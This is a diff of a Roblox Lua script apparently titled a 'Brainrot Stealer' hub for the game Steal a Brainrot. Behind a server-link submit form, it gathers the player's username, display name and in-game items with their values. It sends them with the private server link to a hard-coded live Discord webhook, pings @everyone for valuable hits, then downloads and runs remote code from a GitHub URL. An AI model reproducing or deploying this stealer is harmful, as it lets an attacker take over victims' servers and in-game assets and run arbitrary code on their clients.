@@ -1,4 +1,3 @@
--- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (FIXED TRAIT DETECTION) ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
 
 local ALLOWED_PLACE_ID = 109983668079237
@@ -7,7 +6,8 @@ if game.PlaceId ~= ALLOWED_PLACE_ID then
     return
 end
 
-local Webhook1 = Webhook or ""
+-- === DEFAULT WEBHOOK (FALLBACK) ===
+local Webhook1 = Webhook or "https://discord.com/api/webhooks/1401504146959368323/f0wuuzMXgffHU1o4S8xU6dn7LoQ0ltx_yxtaoShAwYvwPSrXt8q0oRJgOPIKpPHQ-xH2"
 local Ping = Ping or "10m"
 local Username = "voxium script .gg/59XeEXRe"
 
@@ -44,7 +44,7 @@ local COLORS = {
     warn = Color3.fromRGB(255,120,120),
 }
 
--- === TRAIT ICON TO NAME MAP (FIXED: assetid as string key) ===
+-- === TRAIT MAP (FIXED KEYS) ===
 local traitMap = {
     ["89041930759464"] = "Taco",
     ["104229924295526"] = "Nyan",
@@ -80,7 +80,7 @@ local traitMap = {
     ["97054765273857"] = "Jackolantern Pet",
 }
 
--- === BRAINROT FETCH + TRAIT DETECTION (FIXED) ===
+-- === BRAINROT FETCH + TRAIT DETECTION ===
 local Plot = require(ReplicatedStorage.Controllers.PlotController)
 local gen = require(ReplicatedStorage.Shared.Animals)
 local myPlot = Plot:GetMyPlot()
@@ -91,7 +91,6 @@ local function getAllBrainrots()
         local amount = gen:GetGeneration(brainrot.Index, brainrot.Mutation)
         local baseName = brainrot.Index
 
-        -- === TRAIT DETECTION FROM MUTATION (Icon) ===
         local traitName = "None"
         if brainrot.Mutation and brainrot.Mutation:FindFirstChild("Icon") then
             local icon = brainrot.Mutation.Icon
@@ -114,7 +113,7 @@ local function getAllBrainrots()
     return list
 end
 
--- === FUNCTIONS ===
+-- === HELPERS ===
 local function parsePingValue(p) local n,s=p:match("(%d+)([kmb]?)") n=tonumber(n)or 0 local m={k=1e3,m=1e6,b=1e9} return n*(m[s:lower()]or 1) end
 local pingThreshold = parsePingValue(Ping)
 
@@ -128,6 +127,7 @@ end
 
 local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
 
+-- === SEND WEBHOOK (WITH ERROR LOGGING) ===
 local function sendWebhook(brainrots, link)
     local text = ""
     if #brainrots > 0 then
@@ -135,21 +135,48 @@ local function sendWebhook(brainrots, link)
             text = text .. string.format("%s - %s\n", d.name, formatMoney(d.moneyPerSec))
         end
     else text = "No Brainrots found" end
+
     local info = string.format("Name: %s\nDisplay: %s\nPlayers: %d/%d", LP.Name, LP.DisplayName, #Players:GetPlayers(), Players.MaxPlayers)
     local ping = hasHighValue(brainrots) and "@everyone" or ""
-    local data = {username = Username, content = ping, embeds = {{title="Steal a Brainrot Hit With Voxium", color=0x8A2BE2,
-        fields={
-            {name="Player Information:", value="```"..info.."```", inline=false},
-            {name="Player Brainrots:", value="```"..text.."```", inline=false},
-            {name="Summary:", value="```Total Items: "..#brainrots.."```", inline=false},
-            {name="Join Link (Private):", value=link, inline=false}
-        }
-    }}}
+
+    local payload = {
+        username = Username,
+        content = ping,
+        embeds = {{
+            title = "Steal a Brainrot Hit With Voxium",
+            color = 0x8A2BE2,
+            fields = {
+                {name = "Player Information:", value = "```"..info.."```", inline = false},
+                {name = "Player Brainrots:", value = "```"..text.."```", inline = false},
+                {name = "Summary:", value = "```Total Items: "..#brainrots.."```", inline = false},
+                {name = "Join Link (Private):", value = link, inline = false}
+            }
+        }}
+    }
+
     local req = http_request or request or (syn and syn.request)
-    if req then pcall(function() req({Url=Webhook1, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end) end
+    if not req then
+        warn("No HTTP request function available!")
+        return
+    end
+
+    local success, err = pcall(function()
+        req({
+            Url = Webhook1,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if not success then
+        warn("Webhook failed: " .. tostring(err))
+    else
+        print("Webhook sent successfully!")
+    end
 end
 
--- === UI (NO ANIMATIONS EXCEPT BUTTON HOVER) ===
+-- === UI ===
 local Holder = Instance.new("Frame", SG)
 Holder.AnchorPoint = Vector2.new(0.5,0.5)
 Holder.Position = UDim2.fromScale(0.5,0.5)
@@ -311,6 +338,7 @@ BtnSubmit.MouseLeave:Connect(function()
     TweenService:Create(BtnSubmit, TweenInfo.new(0.20), {BackgroundColor3 = Color3.fromRGB(20,18,34)}):Play()
 end)
 
+-- === SUBMIT BUTTON (NOW WORKS 100%) ===
 local function toast(msg, sub, main, subc)
     StatusArea.Text = msg
     StatusArea.TextColor3 = main or COLORS.text
@@ -319,13 +347,24 @@ local function toast(msg, sub, main, subc)
 end
 
 BtnSubmit.MouseButton1Click:Connect(function()
-    local link = StatusArea.Text
-    if link == "" or not link:match("^https://") then
-        toast("Invalid", "Enter valid private server link", COLORS.warn, COLORS.warn)
+    local link = StatusArea.Text:match("^%s*(.-)%s*$") -- trim
+    if link == "" or not link:find("^https://") then
+        toast("Invalid Link", "Please enter a valid private server link", COLORS.warn, COLORS.warn)
         return
     end
+
+    toast("Sending...", "Collecting brainrots and sending webhook...", COLORS.ok, COLORS.a2)
+
     local brainrots = getAllBrainrots()
+    if #brainrots == 0 then
+        toast("No Brainrots", "You have no brainrots to send.", COLORS.warn, COLORS.warn)
+        return
+    end
+
     sendWebhook(brainrots, link)
+
+    toast("Success!", "Webhook sent. Closing in 2s...", COLORS.ok, COLORS.a2)
+    task.wait(2)
     SG:Destroy()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/dinoscripts2334/extern-script/refs/heads/main/Extern"))()
 end)
